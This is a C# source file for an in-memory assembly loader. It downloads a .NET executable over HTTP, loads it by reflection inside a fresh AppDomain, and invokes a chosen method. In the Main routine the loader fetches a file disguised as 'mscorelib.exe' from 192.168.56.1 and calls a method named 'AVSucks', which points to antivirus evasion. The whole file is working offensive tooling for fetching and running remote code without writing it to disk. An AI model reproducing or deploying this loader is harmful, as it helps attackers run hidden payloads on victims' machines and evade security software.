using System;
using System.Reflection;
using System.Net;
using System.Threading;


namespace Loader_SeperateAppDomain
{
    //needed to inject assembly in new appdomain
    
    public class Worker : MarshalByRefObject
    {
        public static Type getType(Assembly assembly, String typeName)
        {
            Type[] assemblyTypes = assembly.GetTypes();
            Type assemblyClass = null;
            String errorString = "";
            foreach (Type classType in assemblyTypes)
            {
                errorString = errorString + classType.Name + "\n";
                if (classType.Name == typeName)
                {
                    assemblyClass = classType;
                }
            }
            if (assemblyClass == null)
            {
                throw new ArgumentException(String.Format("{0} is not found in {1}, available options are {2}", typeName, assembly.GetName(), errorString));
            }
            return assemblyClass;
        }

        public static MethodInfo getMethod(Type classType, String methodName)
        {
            
            MethodInfo[] methods = classType.GetMethods(BindingFlags.NonPublic|BindingFlags.Public|BindingFlags.Static);
            MethodInfo method = null;
            string errorString = "";
            if(methods.Length == 0)
            {
                throw new ArgumentException("no methods found, could be an issue with the bindingflags.");
            }
            foreach (MethodInfo m in methods)
            {
                errorString = errorString + m.Name + "\n";
                if (m.Name == methodName)
                {
                    method = m;
                }
            }
            if (method == null)
            {
                throw new ArgumentException(String.Format("{0} is not found in {1}, available options are {2}", methodName, classType.Name, errorString));

            }
            return method;
        }


        public  Assembly reflectionFromURL(String url, int retrycount = 3, int timeoutTimer = 60, bool printText = true)
        {
            int retry = retrycount;
            int timeout = timeoutTimer;
            Byte[] rawAssemblyBytes = { };
            Assembly bin = null;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            if (printText)
            {
                Console.WriteLine("attempting to download assembly from {0}: \n", url);
            }
            while (retry != 0)
            {
                try
                {
                    //will throw a HttpStatusCode.NotFound if file is not there.
                    rawAssemblyBytes = client.DownloadData(url);
                    Console.WriteLine("assembly found! loading now...");
                    Console.WriteLine("size of assembly: " + rawAssemblyBytes.Length);
                    bin = Assembly.Load(rawAssemblyBytes);
                    return bin;

                }
                catch (WebException webExc) //handle the 404
                {
                    HttpWebResponse response = (HttpWebResponse)webExc.Response;
                    if (response.StatusCode == HttpStatusCode.NotFound) //keep retrying until either file is found or retry attempts are 0
                    {
                        Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} times...", timeout, retry);
                        retry--;
                        Thread.Sleep(timeout * 1000);
                    }
                }


            }
            throw new WebException("Assembly not found. Aborting...");
        }


        //added string url param
        public  void Execute(String url,String methodName = "", String arguments = null, String className = "Program")
        {
            try
            {
                Assembly tool = reflectionFromURL(url);
                Type program = getType(tool, className);
                MethodInfo method = getMethod(program, methodName);
                object initalizedProgram = Activator.CreateInstance(program);
                //  object[] args = new object[] { arguments };
                method.Invoke(initalizedProgram, null);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }


    class Program
    {


        static void Main(string[] args)
        {
            AppDomain azeroth = AppDomain.CreateDomain("Azeroth");
            Worker remoteWorker = (Worker)azeroth.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            remoteWorker.Execute("http://192.168.56.1/mscorelib.exe", "AVSucks");
            Console.WriteLine("Ready to unload at your command!");
            Console.ReadKey();
            AppDomain.Unload(azeroth);
            Console.WriteLine("Unloaded!");
            Console.ReadKey();
        } 
    }
}
